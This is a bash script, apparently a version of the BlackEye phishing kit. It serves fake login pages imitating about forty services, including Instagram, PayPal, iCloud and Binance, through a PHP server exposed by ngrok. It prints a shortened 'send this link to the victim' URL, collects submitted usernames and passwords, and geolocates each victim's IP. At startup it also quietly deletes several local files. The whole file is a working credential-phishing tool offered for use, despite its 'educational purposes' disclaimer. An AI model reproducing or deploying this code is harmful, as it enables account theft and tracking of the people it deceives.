#!/bin/bash

# Trap to stop the script cleanly on Ctrl+C
trap 'printf "\n";stop;exit 1' 2

# Function to open a GitHub page (for option 41)
open_page() {
    url="https://github.com/EricksonAtHome/bes"
    if [[ "$OSTYPE" == "darwin"* ]]; then
        open "$url"
    else
        xdg-open "$url" 2>/dev/null || echo "Please open this URL manually: $url"
    fi
}

# Stop any running PHP or ngrok processes
stop() {
    checkphp=$(ps aux | grep -o "php" | head -n1)
    checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
    if [[ $checkphp == *"php"* ]]; then
        pkill -f -2 php > /dev/null 2>&1
        killall -2 php > /dev/null 2>&1
    fi
    if [[ $checkngrok == *"ngrok"* ]]; then
        pkill -f -2 ngrok > /dev/null 2>&1
        killall -2 ngrok > /dev/null 2>&1
    fi
}

# Display the menu of phishing options
menu() {
    printf "          \e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;91m DropBox\e[0m        \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;91m eBay\e[0m               \n"                                
    printf "          \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;91m Line  \e[0m         \e[1;92m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;91m Amazon\e[0m         \n"
    printf "          \e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;91m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;91m Shopify   \e[0m     \e[1;92m[\e[0m\e[1;77m35\e[0m\e[1;92m]\e[0m\e[1;91m iCloud\e[0m          \n"
    printf "          \e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;91m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;91m Messenger   \e[0m   \e[1;92m[\e[0m\e[1;77m36\e[0m\e[1;92m]\e[0m\e[1;91m Spotify\e[0m          \n"                
    printf "          \e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;91m Github\e[0m         \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;91m GitLab   \e[0m      \e[1;92m[\e[0m\e[1;77m37\e[0m\e[1;92m]\e[0m\e[1;91m Netflix\e[0m          \n"                
    printf "          \e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;91m Google\e[0m         \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;91m Twitch   \e[0m      \e[1;92m[\e[0m\e[1;77m38\e[0m\e[1;92m]\e[0m\e[1;91m Reddit\e[0m         \n"
    printf "          \e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;91m Origin\e[0m         \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;91m MySpace    \e[0m    \e[1;92m[\e[0m\e[1;77m39\e[0m\e[1;92m]\e[0m\e[1;91m StackOverflow\e[0m         \n"
    printf "          \e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;91m Yahoo\e[0m          \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;91m Badoo   \e[0m       \e[1;92m[\e[0m\e[1;77m40\e[0m\e[1;92m]\e[0m\e[1;91m Custom\e[0m         \n"        
    printf "          \e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;91m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;91m VK   \e[0m                   \n"         
    printf "          \e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;91m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;91m Yandex   \e[0m               \n"
    printf "          \e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;91m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;91m devianART   \e[0m            \n"
    printf "          \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;91m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;91m Wi-Fi   \e[0m                \n"
    printf "          \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;91m IGFollowers\e[0m    \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;91m PayPal  \e[0m                \n"
    printf "          \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;91m Pinterest\e[0m      \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;91m Steam  \e[0m                              \n"
    printf "          \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;91m Apple ID\e[0m       \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;91m Tiktok \e[0m                             \n"
    printf "          \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Verizon\e[0m        \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;91m Playstation  \e[0m           \e[1;94m                  \n"
    printf "          \e[1;92m[\e[0m\e[1;77m41\e[0m\e[1;92m]\e[0m\e[1;91m Binance Email Support \e[0m       \e[1;94m             \n"

    read -p $'\n\e[1;92m\e[0m\e[1;77m\e[0m\e[1;92m ┌─[ Choose an option:]─[~]\n └──╼ ~ ' option

    case $option in
        1) server="instagram"; start ;;
        2) server="facebook"; start ;;
        3) server="snapchat"; start ;;
        4) server="twitter"; start ;;
        5) server="github"; start ;;
        6) server="google"; start ;;
        7) server="origin"; start ;;
        8) server="yahoo"; start ;;
        9) server="linkedin"; start ;;
        10) server="protonmail"; start ;;
        11) server="wordpress"; start ;;
        12) server="microsoft"; start ;;
        13) server="instafollowers"; start ;;
        14) server="pinterest"; start ;;
        15) server="apple"; start ;;
        16) server="verizon"; start ;;
        17) server="dropbox"; start ;;
        18) server="line"; start ;;
        19) server="shopify"; start ;;
        20) server="messenger"; start ;;
        21) server="gitlab"; start ;;
        22) server="twitch"; start ;;
        23) server="myspace"; start ;;
        24) server="badoo"; start ;;
        25) server="vk"; start ;;
        26) server="yandex"; start ;;
        27) server="devianart"; start ;;
        28) server="wifi"; start ;;
        29) server="paypal"; start ;;
        30) server="steam"; start ;;
        31) server="tiktok"; start ;;
        32) server="playstation"; start ;;
        33) server="shopping"; start ;;
        34) server="amazon"; start ;;
        35) server="icloud"; start ;;
        36) server="spotify"; start ;;
        37) server="netflix"; start ;;
        38) server="reddit"; start ;;
        39) server="stackoverflow"; start ;;
        40) server="create"; createpage; start ;;
        41) open_page ;;
        *) printf "\e[1;93m [!] Invalid option!\e[0m\n"; menu ;;
    esac
}

# Create a custom phishing page
createpage() {
    default_cap1="Wi-fi Session Expired"
    default_cap2="Please login again."
    default_user_text="Username:"
    default_pass_text="Password:"
    default_sub_text="Log-In"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
    cap1="${cap1:-${default_cap1}}"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
    cap2="${cap2:-${default_cap2}}"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
    user_text="${user_text:-${default_user_text}}"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
    pass_text="${pass_text:-${default_pass_text}}"

    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
    sub_text="${sub_text:-${default_sub_text}}"

    echo "<!DOCTYPE html>" > sites/create/login.html
    echo "<html>" >> sites/create/login.html
    echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html
    printf '<center><h2> %s <br><br> %s </h2></center><center>\n' "$cap1" "$cap2" >> sites/create/login.html
    printf '<form method="POST" action="login.php"><label>%s </label>\n' "$user_text" >> sites/create/login.html
    printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html
    printf '<br><label>%s: </label>' "$pass_text" >> sites/create/login.html
    printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html
    printf '<input value="%s" type="submit"></form>\n' "$sub_text" >> sites/create/login.html
    printf '</center></body></html>\n' >> sites/create/login.html
}

# Capture credentials from the phishing page
catch_cred() {
    account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
    password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" "$account"
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" "$password"
    cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" "$server"
    stop
    exit 1
}

# Wait for credentials to be submitted
getcredentials() {
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for credentials ...\e[0m\n"
    while true; do
        if [[ -e "sites/$server/usernames.txt" ]]; then
            printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
            catch_cred
        fi
        sleep 1
    done
}

# Capture the victim's IP and geolocation
catch_ip() {
    touch sites/$server/saved.usernames.txt
    ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
    ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
    ipv4=$(curl -s "https://ipinfo.io/$ip/json" | jq -r '.ip')
    cn=$(curl -s "https://ipapi.co/$ip/json/" | jq -r '.country_name')
    re=$(curl -s "https://ipapi.co/$ip/json/" | jq -r '.region')
    ct=$(curl -s "https://ipapi.co/$ip/json/" | jq -r '.city')
    post=$(curl -s "https://ipapi.co/$ip/json/" | jq -r '.postal')
    loc=$(curl -s "https://ipinfo.io/$ip/json" | jq -r '.loc')
    org=$(curl -s "https://ipinfo.io/$ip/json" | jq -r '.org')
    tz=$(curl -s "https://ipinfo.io/$ip/json" | jq -r '.timezone')
    lat=$(curl -s "https://ipapi.co/$ip/json/" | jq -r '.latitude')
    lon=$(curl -s "https://ipapi.co/$ip/json/" | jq -r '.longitude')

    gm="https://www.google.com/maps/search/?api=1&query=$lat,$lon"

    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" "$ua"
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Country:\e[0m\e[1;77m %s\e[0m\n" "$cn"
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Region:\e[0m\e[1;77m %s\e[0m\n" "$re"
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] City:\e[0m\e[1;77m %s\e[0m\n" "$ct"
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Postal:\e[0m\e[1;77m %s\e[0m\n" "$post"
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Location:\e[0m\e[1;77m %s\e[0m\n" "$loc"
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Maps:\e[0m\e[1;77m %s\e[0m\n" "$gm"
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] ISP:\e[0m\e[1;77m %s\e[0m\n" "$org"
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Timezone:\e[0m\e[1;77m %s\e[0m\n" "$tz"
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.ip.txt\e[0m\n" "$server"
    cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
    getcredentials
}

# Start the phishing server and ngrok
start() {
    if [[ -e sites/$server/ip.txt ]]; then
        rm -rf sites/$server/ip.txt
    fi
    if [[ -e sites/$server/usernames.txt ]]; then
        rm -rf sites/$server/usernames.txt
    fi

    printf "\e[1;92m[\e[0m*\e[1;92m] Starting PHP server on localhost:5555...\n"
    cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
    sleep 2

    printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
    ngrok http 5555 > /dev/null 2>&1 &
    sleep 10

    # Extract the ngrok URL
    ngrok_url=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
    if [[ -z "$ngrok_url" ]]; then
        printf "\e[1;93m[!] Failed to get ngrok URL. Ensure ngrok is running and try again.\e[0m\n"
        stop
        exit 1
    fi

    printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the victim:\e[0m\e[1;77m %s\e[0m\n" "$ngrok_url"

    # Shorten the URL using TinyURL
    short_link=$(wget -q -O - "http://tinyurl.com/api-create.php?url=$ngrok_url")
    if [[ -n "$short_link" ]]; then
        printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" "$short_link"
    fi

    checkfound
}

# Check if the victim has interacted with the page
checkfound() {
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for victim to open the link ...\e[0m\n"
    while true; do
        if [[ -e "sites/$server/ip.txt" ]]; then
            printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
            catch_ip
        fi
        sleep 1
    done
}

# Display the banner
banner() {
    printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
    printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by BlackEye.  ::\e[0m\n"
    printf "     \e[101m\e[1;77m:: Only use for educational purposes!!                      ::\e[0m\n"
    printf "\n"
    printf "     \e[101m\e[1;77m::     BLACKEYE By @shuvo-halder                             ::\e[0m\n"
    printf "\n"
}

# Clean up unnecessary files and start the script
rm -rf setup.sh tmxsp.sh index.html .gitignore .nojekyll 2>/dev/null
banner
menu
